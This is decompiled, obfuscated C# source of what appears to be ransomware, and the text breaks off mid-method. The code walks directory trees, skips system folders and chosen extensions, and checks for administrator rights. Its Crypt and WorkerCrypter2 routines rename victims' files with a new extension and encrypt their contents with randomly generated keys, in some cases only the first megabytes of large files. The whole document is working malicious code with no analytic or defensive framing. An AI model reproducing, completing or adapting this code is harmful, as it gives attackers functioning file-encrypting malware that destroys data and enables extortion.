using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using ZezoEdMCwYjXbN;
using nLekQTrDWiq;

namespace wawLLalyhHSFm;

internal sealed class ufSaqXYLSvVxK
{
	public sealed class xAVhAapNqi
	{
		private static StringCollection xCRhxivyBZc;

		private static List<string> xUMCljPSVyct;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107402566));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107402561)) && !text.ToLower().Contains(getString_0(107402572)) && !text.ToLower().Contains(getString_0(107389190)) && !text.ToLower().Contains(getString_0(107389177)) && !text.ToLower().Contains(getString_0(107402527)) && !text.ToLower().Contains(getString_0(107389541)) && !text.ToLower().Contains(getString_0(107389514)) && !text.ToLower().Contains(getString_0(107389465)) && !text.ToLower().Contains(getString_0(107389480)) && !text.ToLower().Contains(getString_0(107389431)) && !text.ToLower().Contains(getString_0(107389429)) && !text.ToLower().Contains(getString_0(107389380)) && !text.ToLower().Contains(getString_0(107389395)) && !text.ToLower().Contains(getString_0(107389350)) && !text.ToLower().Contains(getString_0(107389361)) && !text.ToLower().Contains(getString_0(107389316)) && !text.ToLower().Contains(getString_0(107389303)) && !text.ToLower().Contains(getString_0(107388774)) && !text.ToLower().Contains(getString_0(107388789)) && !text.Contains(hcAHXMuOvto(getString_0(107388740))) && !text.Contains(getString_0(107388747)) && !text.Contains(getString_0(107388702)) && !text.EndsWith(getString_0(107395240)) && !text.EndsWith(getString_0(107388677)) && !text.EndsWith(getString_0(107388672)) && !text.EndsWith(getString_0(107388667)) && !text.EndsWith(getString_0(107388694)) && !text.ToLower().Contains(getString_0(107388689)) && !text.ToLower().Contains(vyePyvbVLbeEqa))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(GpINWHpOESmKHe) * 1024.0 * 1024.0 && RitzjDPaNqQZW == getString_0(107396774))
							{
								xUMCljPSVyct.Add(text);
							}
							else if (File.Exists(text) && RitzjDPaNqQZW == getString_0(107397063))
							{
								xUMCljPSVyct.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return xUMCljPSVyct;
		}

		static xAVhAapNqi()
		{
			Strings.CreateGetStringDelegate(typeof(xAVhAapNqi));
			xCRhxivyBZc = new StringCollection();
			xUMCljPSVyct = new List<string>();
		}
	}

	private sealed class VgvdrmsYlwjuFP
	{
		public string YyOJKretSgjh;

		public bool _003CMain_003Eb__5(Process process_0)
		{
			return process_0.ProcessName == YyOJKretSgjh;
		}
	}

	private sealed class smbJHwQJoYcG
	{
		public string ZHWSlOCXcEDLfk;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CMapDrv_003Eb__19(int int_0)
		{
			Thread.Sleep(RmKdlhAIesG);
			apDawShQCtslB.Add(getString_0(107388622) + ZHWSlOCXcEDLfk + getString_0(107397179) + (char)int_0 + getString_0(107402545));
			try
			{
				if (zZWgofEFsLDUuOW)
				{
					Console.WriteLine(getString_0(107388622) + ZHWSlOCXcEDLfk + getString_0(107397179) + (char)int_0 + getString_0(107402545));
				}
			}
			catch
			{
			}
		}

		static smbJHwQJoYcG()
		{
			Strings.CreateGetStringDelegate(typeof(smbJHwQJoYcG));
		}
	}

	private sealed class viFMLSLcEXwpNj
	{
		public string VjJzqQkJlyFL;

		public bool _003CIsDriveNTFS_003Eb__1e(DriveInfo driveInfo_0)
		{
			return driveInfo_0.RootDirectory.Name == VjJzqQkJlyFL;
		}
	}

	private sealed class XydbNjCPrwlqLZ
	{
		private sealed class sCAtfVfcXrwd
		{
			public XydbNjCPrwlqLZ GSHErlOGCrhsk;

			public string eyKRckGTMKw;

			public void _003CCrypt_003Eb__28()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					aPIhDICFGSi(WindowsIdentity.GetCurrent().Name, eyKRckGTMKw);
				}
			}

			public void _003CCrypt_003Eb__29()
			{
				GZcjjutrdguzHu(eyKRckGTMKw, GSHErlOGCrhsk.qVfvEpVNqJBLvh, GSHErlOGCrhsk.rrtTQSJuAstKD, GSHErlOGCrhsk.zIgOoCiQcdgcTO, GSHErlOGCrhsk.XJsqqBmwQnp);
			}
		}

		public string[] qVfvEpVNqJBLvh;

		public string[] zIgOoCiQcdgcTO;

		public string XJsqqBmwQnp;

		public string rrtTQSJuAstKD;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__27(string string_0)
		{
			sCAtfVfcXrwd CS_0024_003C_003E8__locals0 = new sCAtfVfcXrwd();
			CS_0024_003C_003E8__locals0.GSHErlOGCrhsk = this;
			CS_0024_003C_003E8__locals0.eyKRckGTMKw = string_0;
			if (xazslhOFeW && !PAnwnUZwtskZZp().Contains(getString_0(107386185)) && !PAnwnUZwtskZZp().Contains(getString_0(107386081)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						aPIhDICFGSi(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.eyKRckGTMKw);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (ZYTlzkdcoENHWE == getString_0(107396783))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					GZcjjutrdguzHu(CS_0024_003C_003E8__locals0.eyKRckGTMKw, CS_0024_003C_003E8__locals0.GSHErlOGCrhsk.qVfvEpVNqJBLvh, CS_0024_003C_003E8__locals0.GSHErlOGCrhsk.rrtTQSJuAstKD, CS_0024_003C_003E8__locals0.GSHErlOGCrhsk.zIgOoCiQcdgcTO, CS_0024_003C_003E8__locals0.GSHErlOGCrhsk.XJsqqBmwQnp);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				GZcjjutrdguzHu(CS_0024_003C_003E8__locals0.eyKRckGTMKw, qVfvEpVNqJBLvh, rrtTQSJuAstKD, zIgOoCiQcdgcTO, XJsqqBmwQnp);
			}
		}

		static XydbNjCPrwlqLZ()
		{
			Strings.CreateGetStringDelegate(typeof(XydbNjCPrwlqLZ));
		}
	}

	private sealed class VQdrzQouGeJmOOKE
	{
		private sealed class AGSmvpoqel
		{
			public VQdrzQouGeJmOOKE ZJsnJmUSSBrjdDIR;

			public string CXGveYPEqSmVsTHeB;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__35()
			{
				foreach (string item in rSxQCGHPFw)
				{
					if (CXGveYPEqSmVsTHeB.ToLower().EndsWith(item + ZJsnJmUSSBrjdDIR.ApXJMbmTnc) && BTmYNKJoWXy == getString_0(107396794))
					{
						if (Convert.ToInt32(ZgtheUfHxbisWo) * 1024 * 1024 > new FileInfo(CXGveYPEqSmVsTHeB).Length)
						{
							try
							{
								PRbKLyXwxCMy.KUjtevBxHIDiZB(getString_0(107390422), getString_0(107390417), getString_0(107390436), CXGveYPEqSmVsTHeB);
							}
							catch
							{
							}
						}
					}
					else if (CXGveYPEqSmVsTHeB.ToLower().EndsWith(item) && BTmYNKJoWXy == getString_0(107397083))
					{
						try
						{
							PRbKLyXwxCMy.KUjtevBxHIDiZB(getString_0(107390422), getString_0(107390417), getString_0(107390436), CXGveYPEqSmVsTHeB);
						}
						catch
						{
						}
					}
				}
			}

			static AGSmvpoqel()
			{
				Strings.CreateGetStringDelegate(typeof(AGSmvpoqel));
			}
		}

		private sealed class hjDtcmdkFEUCoUqO
		{
			public VQdrzQouGeJmOOKE ZJsnJmUSSBrjdDIR;

			public string HDYHoqvFVoE;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__37()
			{
				foreach (string item in rSxQCGHPFw)
				{
					if (HDYHoqvFVoE.ToLower().EndsWith(item + ZJsnJmUSSBrjdDIR.ApXJMbmTnc) && BTmYNKJoWXy == getString_0(107396797))
					{
						if (Convert.ToInt32(ZgtheUfHxbisWo) * 1024 * 1024 > new FileInfo(HDYHoqvFVoE).Length)
						{
							try
							{
								PRbKLyXwxCMy.KUjtevBxHIDiZB(getString_0(107390425), getString_0(107390420), getString_0(107390439), HDYHoqvFVoE);
							}
							catch
							{
							}
						}
					}
					else if (HDYHoqvFVoE.ToLower().EndsWith(item) && BTmYNKJoWXy == getString_0(107397086))
					{
						try
						{
							PRbKLyXwxCMy.KUjtevBxHIDiZB(getString_0(107390425), getString_0(107390420), getString_0(107390439), HDYHoqvFVoE);
						}
						catch
						{
						}
					}
				}
			}

			static hjDtcmdkFEUCoUqO()
			{
				Strings.CreateGetStringDelegate(typeof(hjDtcmdkFEUCoUqO));
			}
		}

		public List<string> MVedNZaXiLgL;

		public List<string> fUBdEKZyHcMt;

		public string ApXJMbmTnc;

		public string[] fFnbbgAKLY;

		public string aVkwyftWjF;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__34(string string_0)
		{
			AGSmvpoqel CS_0024_003C_003E8__locals0;
			foreach (string item in fUBdEKZyHcMt)
			{
				if (item.Contains(getString_0(107389314)) || item.Contains(getString_0(107389257)) || item.Contains(getString_0(107389224)) || item.ToLower().Contains(getString_0(107389207)) || item.ToLower().Contains(getString_0(107389194)) || item.Contains(getString_0(107389169)) || item.Contains(getString_0(107389180)) || item.ToLower().Contains(getString_0(107389135)) || item.ToLower().Contains(getString_0(107389154)) || item.ToLower().Contains(getString_0(107389117)) || item.ToLower().Contains(getString_0(107389076)) || item.ToLower().Contains(getString_0(107389091)) || item.ToLower().Contains(getString_0(107389545)) || item.ToLower().Contains(getString_0(107389524)) || item.Contains(getString_0(107389531)) || item.Contains(getString_0(107389482)) || item.Contains(getString_0(107389497)) || item.Contains(getString_0(107389448)) || item.Contains(getString_0(107389431)) || item.Contains(getString_0(107389446)) || item.Contains(getString_0(107389397)) || item.Contains(getString_0(107389412)) || item.Contains(getString_0(107389367)) || item.Contains(getString_0(107389378)) || item.ToLower().Contains(getString_0(107389333)) || item.ToLower().Contains(getString_0(107389320)) || item.ToLower().Contains(getString_0(107388791)) || item.ToLower().Contains(getString_0(107388806)) || item.Contains(hcAHXMuOvto(getString_0(107388757))) || item.Contains(getString_0(107388764)) || item.Contains(getString_0(107397220)) || item.Contains(getString_0(107388719)) || item.EndsWith(ApXJMbmTnc) || item.EndsWith(getString_0(107388694)) || item.EndsWith(getString_0(107388689)) || item.EndsWith(getString_0(107388684)) || item.EndsWith(getString_0(107388711)) || item.Contains(getString_0(107388706)) || item.Contains(vyePyvbVLbeEqa) || item.Contains(ZmxznfzcMXVgTR) || item.Contains(xrvDxaCBctsjEXT))
				{
					continue;
				}
				if (fFnbbgAKLY.Length != 0)
				{
					string[] array = fFnbbgAKLY;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0e93;
					}
				}
				try
				{
					if (item.EndsWith(ApXJMbmTnc))
					{
						goto IL_0e93;
					}
				}
				catch (Exception)
				{
					goto IL_0e93;
				}
				if (!item.EndsWith(string_0) || kQacklGScvGB.Contains(item))
				{
					continue;
				}
				if (VtgyThVicrA == getString_0(107396791))
				{
					try
					{
						if (zGtpjDKaRKnN.xfoUezvsOShUpjR(item))
						{
							zGtpjDKaRKnN.kXZHKHEOIChOkFR(item);
						}
					}
					catch
					{
					}
				}
				kQacklGScvGB.Add(item);
				if (!XhCnheiZHlf.Contains(Path.GetDirectoryName(item)))
				{
					XhCnheiZHlf.Add(Path.GetDirectoryName(item));
				}
				TUNusUrhcyiCD(item);
				try
				{
					new qxmBSGuDUn().BIKmJflQUBqn(item);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (zZWgofEFsLDUuOW)
							{
								Console.WriteLine(getString_0(107402554) + item + getString_0(107402477) + new FileInfo(item).Length + getString_0(107402488));
								Console.WriteLine(getString_0(107402447));
							}
						}
						catch
						{
						}
						rNfIJaiTMyCx(hcAHXMuOvto(getString_0(107402886)), getString_0(107388590) + item + getString_0(107388590) + hcAHXMuOvto(getString_0(107402829)) + getString_0(107388590) + Environment.UserName + getString_0(107388590) + hcAHXMuOvto(getString_0(107402844)));
					}
				}
				catch (Exception ex2)
				{
					if (YGBzDBzlDVGPdcyT)
					{
						try
						{
							File.AppendAllText(ZmxznfzcMXVgTR, getString_0(107386839) + item + getString_0(107402819) + ex2.Message + getString_0(107396590));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (YGBzDBzlDVGPdcyT)
						{
							try
							{
								File.AppendAllText(ZmxznfzcMXVgTR, getString_0(107386839) + item + getString_0(107402706) + ex4.Message + getString_0(107396590));
							}
							catch (Exception)
							{
							}
						}
						IwoWsCVOvNqeRACr++;
						goto end_IL_0716;
					}
					if (DVGbUCJGnq == getString_0(107396791) && new FileInfo(item).Length > Convert.ToInt32(kituZbADEtf) * 1024 * 1024 && !MVedNZaXiLgL.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new AGSmvpoqel();
						CS_0024_003C_003E8__locals0.ZJsnJmUSSBrjdDIR = this;
						try
						{
							if (ApXJMbmTnc != getString_0(107386067))
							{
								if (izNvindkdEa)
								{
									ApXJMbmTnc = PDiDpTsAaoZu + ApXJMbmTnc;
								}
								File.Move(item, item + ApXJMbmTnc);
							}
						}
						catch (Exception ex6)
						{
							if (YGBzDBzlDVGPdcyT)
							{
								try
								{
									File.AppendAllText(ZmxznfzcMXVgTR, getString_0(107386839) + item + getString_0(107402645) + ex6.Message + getString_0(107396590));
								}
								catch (Exception)
								{
								}
							}
							IwoWsCVOvNqeRACr++;
							goto end_IL_0716;
						}
						CS_0024_003C_003E8__locals0.CXGveYPEqSmVsTHeB = getString_0(107390370);
						if (ApXJMbmTnc != getString_0(107386067))
						{
							CS_0024_003C_003E8__locals0.CXGveYPEqSmVsTHeB = item + ApXJMbmTnc;
						}
						else
						{
							CS_0024_003C_003E8__locals0.CXGveYPEqSmVsTHeB = item;
						}
						if (KsYUZJCeItFet == getString_0(107396791))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in rSxQCGHPFw)
								{
									if (CS_0024_003C_003E8__locals0.CXGveYPEqSmVsTHeB.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.ZJsnJmUSSBrjdDIR.ApXJMbmTnc) && BTmYNKJoWXy == AGSmvpoqel.getString_0(107396794))
									{
										if (Convert.ToInt32(ZgtheUfHxbisWo) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.CXGveYPEqSmVsTHeB).Length)
										{
											try
											{
												PRbKLyXwxCMy.KUjtevBxHIDiZB(AGSmvpoqel.getString_0(107390422), AGSmvpoqel.getString_0(107390417), AGSmvpoqel.getString_0(107390436), CS_0024_003C_003E8__locals0.CXGveYPEqSmVsTHeB);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.CXGveYPEqSmVsTHeB.ToLower().EndsWith(item2) && BTmYNKJoWXy == AGSmvpoqel.getString_0(107397083))
									{
										try
										{
											PRbKLyXwxCMy.KUjtevBxHIDiZB(AGSmvpoqel.getString_0(107390422), AGSmvpoqel.getString_0(107390417), AGSmvpoqel.getString_0(107390436), CS_0024_003C_003E8__locals0.CXGveYPEqSmVsTHeB);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = PXBlVMuKtjxUxD.bQxbGMQPqE(32);
						string text2 = getString_0(107390370);
						text2 = (TTTJwfHUqgyKmj ? PXBlVMuKtjxUxD.NKBPlLpLanL() : getString_0(107390370));
						string s = pmEBRznCyJCsrx.otEPbnvZbIA(text + text2);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (uZGrkbWLHwtb == getString_0(107397080))
						{
							byte[] array2 = null;
							byte[] byte_ = PywWzStJmnOP.qDPulRCUpTwRa(CS_0024_003C_003E8__locals0.CXGveYPEqSmVsTHeB, Convert.ToInt32(kituZbADEtf) * 1024 * 1024);
							if (PywWzStJmnOP.eZPzeLHBKntVHTM(VfjTsBqJDSVT: (!ToytCwhuOZ) ? (TTTJwfHUqgyKmj ? PywWzStJmnOP.SCrqszkvgt(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : PywWzStJmnOP.SCrqszkvgt(byte_, Convert.FromBase64String(aVkwyftWjF), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (TTTJwfHUqgyKmj ? LQKLndoDiyu.GrlNceGkOvk(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : LQKLndoDiyu.GrlNceGkOvk(byte_, Convert.FromBase64String(aVkwyftWjF), Convert.FromBase64String(UQzJrkNAgAyNPg))), eDBBwAsYeVCx: CS_0024_003C_003E8__locals0.CXGveYPEqSmVsTHeB, EeTyBkmkZsu: bytes))
							{
								goto IL_0e93;
							}
							try
							{
								File.Move(item + ApXJMbmTnc, item);
							}
							catch (Exception)
							{
							}
						}
						else if (!TTTJwfHUqgyKmj)
						{
							if (xwkLEGVxhadEUV.ROTZWSZwBsMXoW(CS_0024_003C_003E8__locals0.CXGveYPEqSmVsTHeB, kituZbADEtf, aVkwyftWjF, null, Convert.FromBase64String(UQzJrkNAgAyNPg)))
							{
								goto IL_0e93;
							}
							try
							{
								File.Move(item + ApXJMbmTnc, item);
							}
							catch (Exception)
							{
							}
						}
						else
						{
							if (xwkLEGVxhadEUV.ROTZWSZwBsMXoW(CS_0024_003C_003E8__locals0.CXGveYPEqSmVsTHeB, kituZbADEtf, text, bytes, Convert.FromBase64String(text2)))
							{
								goto IL_0e93;
							}
							try
							{
								File.Move(item + ApXJMbmTnc, item);
							}
							catch (Exception)
							{
							}
						}
						continue;
					}
					if (izNvindkdEa)
					{
						ApXJMbmTnc = PDiDpTsAaoZu + ApXJMbmTnc;
					}
					string text3 = PXBlVMuKtjxUxD.bQxbGMQPqE(32);
					string text4 = getString_0(107390370);
					text4 = (TTTJwfHUqgyKmj ? PXBlVMuKtjxUxD.NKBPlLpLanL() : getString_0(107390370));
					string s2 = pmEBRznCyJCsrx.otEPbnvZbIA(text3 + text4);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (ApXJMbmTnc != getString_0(107386067))
					{
						if (!lMzMCwfLjdb)
						{
							if (!TTTJwfHUqgyKmj)
							{
								tjNNgredhuoLn(item, item + ApXJMbmTnc, ZWfNLTTCJEsBadr);
							}
							else
							{
								tjNNgredhuoLn(item, item + ApXJMbmTnc, Convert.FromBase64String(text3));
							}
						}
						else
						{
							try
							{
								if (!TTTJwfHUqgyKmj)
								{
									xupzWdtCvyjPfw(item, item + ApXJMbmTnc, ZWfNLTTCJEsBadr, Convert.FromBase64String(UQzJrkNAgAyNPg));
								}
								else
								{
									xupzWdtCvyjPfw(item, item + ApXJMbmTnc, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
								}
							}
							catch (Exception ex11)
							{
								if (YGBzDBzlDVGPdcyT)
								{
									try
									{
										File.AppendAllText(ZmxznfzcMXVgTR, getString_0(107386839) + item + getString_0(107386085) + ex11.Message + getString_0(107396590));
									}
									catch (Exception)
									{
									}
								}
								IwoWsCVOvNqeRACr++;
								try
								{
									File.Move(item + ApXJMbmTnc, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_0716;
							}
						}
					}
					else if (!lMzMCwfLjdb)
					{
						if (!TTTJwfHUqgyKmj)
						{
							tjNNgredhuoLn(item, item + getString_0(107386062), ZWfNLTTCJEsBadr);
						}
						else
						{
							tjNNgredhuoLn(item, item + getString_0(107386062), Convert.FromBase64String(text3));
						}
					}
					else
					{
						try
						{
							if (!TTTJwfHUqgyKmj)
							{
								xupzWdtCvyjPfw(item, item, ZWfNLTTCJEsBadr, Convert.FromBase64String(UQzJrkNAgAyNPg));
							}
							else
							{
								xupzWdtCvyjPfw(item, item, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
							}
						}
						catch (Exception ex14)
						{
							if (YGBzDBzlDVGPdcyT)
							{
								try
								{
									File.AppendAllText(ZmxznfzcMXVgTR, getString_0(107386839) + item + getString_0(107386085) + ex14.Message + getString_0(107396590));
								}
								catch (Exception)
								{
								}
							}
							IwoWsCVOvNqeRACr++;
							goto end_IL_0716;
						}
					}
					if (TTTJwfHUqgyKmj)
					{
						if (ApXJMbmTnc != getString_0(107386067))
						{
							TnxDxZQzabkSS(item + ApXJMbmTnc, bytes2);
						}
						else
						{
							TnxDxZQzabkSS(item, bytes2);
						}
					}
					goto IL_0e93;
					end_IL_0716:;
				}
				catch (Exception)
				{
					goto IL_0e93;
				}
				continue;
				IL_0e93:
				fUBdEKZyHcMt.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__36(string string_0)
		{
			hjDtcmdkFEUCoUqO CS_0024_003C_003E8__locals0 = new hjDtcmdkFEUCoUqO();
			CS_0024_003C_003E8__locals0.ZJsnJmUSSBrjdDIR = this;
			CS_0024_003C_003E8__locals0.HDYHoqvFVoE = string_0;
			if (!CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(getString_0(107389314)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(getString_0(107389257)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(getString_0(107389224)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.ToLower().Contains(getString_0(107389207)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.ToLower().Contains(getString_0(107389194)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(getString_0(107389169)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(getString_0(107389180)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.ToLower().Contains(getString_0(107389135)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.ToLower().Contains(getString_0(107389154)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.ToLower().Contains(getString_0(107389117)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.ToLower().Contains(getString_0(107389076)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.ToLower().Contains(getString_0(107389091)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.ToLower().Contains(getString_0(107389545)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.ToLower().Contains(getString_0(107389524)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(getString_0(107389531)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(getString_0(107389482)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(getString_0(107389497)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(getString_0(107389448)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(getString_0(107389431)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(getString_0(107389446)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(getString_0(107389397)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(getString_0(107389412)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(getString_0(107389367)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(getString_0(107389378)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.ToLower().Contains(getString_0(107389333)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.ToLower().Contains(getString_0(107389320)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.ToLower().Contains(getString_0(107388791)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.ToLower().Contains(getString_0(107388806)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(hcAHXMuOvto(getString_0(107388757))) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(getString_0(107388764)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(getString_0(107397220)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(getString_0(107388719)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.EndsWith(ApXJMbmTnc) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.EndsWith(getString_0(107388694)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.EndsWith(getString_0(107388689)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.EndsWith(getString_0(107388684)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.EndsWith(getString_0(107388711)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(getString_0(107388706)) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(vyePyvbVLbeEqa) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(ZmxznfzcMXVgTR) && !CS_0024_003C_003E8__locals0.HDYHoqvFVoE.Contains(xrvDxaCBctsjEXT))
			{
				if (fFnbbgAKLY.Length != 0)
				{
					string[] array = fFnbbgAKLY;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!CS_0024_003C_003E8__locals0.HDYHoqvFVoE.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_1069;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.HDYHoqvFVoE.EndsWith(ApXJMbmTnc))
					{
						goto IL_1069;
					}
				}
				catch (Exception)
				{
					goto IL_1069;
				}
				if (!kQacklGScvGB.Contains(CS_0024_003C_003E8__locals0.HDYHoqvFVoE))
				{
					if (VtgyThVicrA == getString_0(107396791))
					{
						try
						{
							if (zGtpjDKaRKnN.xfoUezvsOShUpjR(CS_0024_003C_003E8__locals0.HDYHoqvFVoE))
							{
								zGtpjDKaRKnN.kXZHKHEOIChOkFR(CS_0024_003C_003E8__locals0.HDYHoqvFVoE);
							}
						}
						catch
						{
						}
					}
					kQacklGScvGB.Add(CS_0024_003C_003E8__locals0.HDYHoqvFVoE);
					if (!XhCnheiZHlf.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.HDYHoqvFVoE)))
					{
						XhCnheiZHlf.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.HDYHoqvFVoE));
					}
					TUNusUrhcyiCD(CS_0024_003C_003E8__locals0.HDYHoqvFVoE);
					try
					{
						new qxmBSGuDUn().BIKmJflQUBqn(CS_0024_003C_003E8__locals0.HDYHoqvFVoE);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.HDYHoqvFVoE, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (zZWgofEFsLDUuOW)
								{
									Console.WriteLine(getString_0(107402554) + CS_0024_003C_003E8__locals0.HDYHoqvFVoE + getString_0(107402477) + new FileInfo(CS_0024_003C_003E8__locals0.HDYHoqvFVoE).Length + getString_0(107402488));
									Console.WriteLine(getString_0(107402447));
								}
							}
							catch
							{
							}
							rNfIJaiTMyCx(hcAHXMuOvto(getString_0(107402886)), getString_0(107388590) + CS_0024_003C_003E8__locals0.HDYHoqvFVoE + getString_0(107388590) + hcAHXMuOvto(getString_0(107402829)) + getString_0(107388590) + Environment.UserName + getString_0(107388590) + hcAHXMuOvto(getString_0(107402844)));
						}
					}
					catch (Exception ex2)
					{
						if (YGBzDBzlDVGPdcyT)
						{
							try
							{
								File.AppendAllText(ZmxznfzcMXVgTR, getString_0(107386839) + CS_0024_003C_003E8__locals0.HDYHoqvFVoE + getString_0(107402819) + ex2.Message + getString_0(107396590));
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.HDYHoqvFVoE).Length != 0L)
							{
								goto end_IL_085c;
							}
							goto end_IL_085c_2;
							end_IL_085c:;
						}
						catch (Exception ex4)
						{
							if (YGBzDBzlDVGPdcyT)
							{
								try
								{
									File.AppendAllText(ZmxznfzcMXVgTR, getString_0(107386839) + CS_0024_003C_003E8__locals0.HDYHoqvFVoE + getString_0(107402706) + ex4.Message + getString_0(107396590));
								}
								catch (Exception)
								{
								}
							}
							IwoWsCVOvNqeRACr++;
							goto end_IL_085c_2;
						}
						if (DVGbUCJGnq == getString_0(107396791) && new FileInfo(CS_0024_003C_003E8__locals0.HDYHoqvFVoE).Length > Convert.ToInt32(kituZbADEtf) * 1024 * 1024)
						{
							try
							{
								if (ApXJMbmTnc != getString_0(107386067))
								{
									if (izNvindkdEa)
									{
										ApXJMbmTnc = PDiDpTsAaoZu + ApXJMbmTnc;
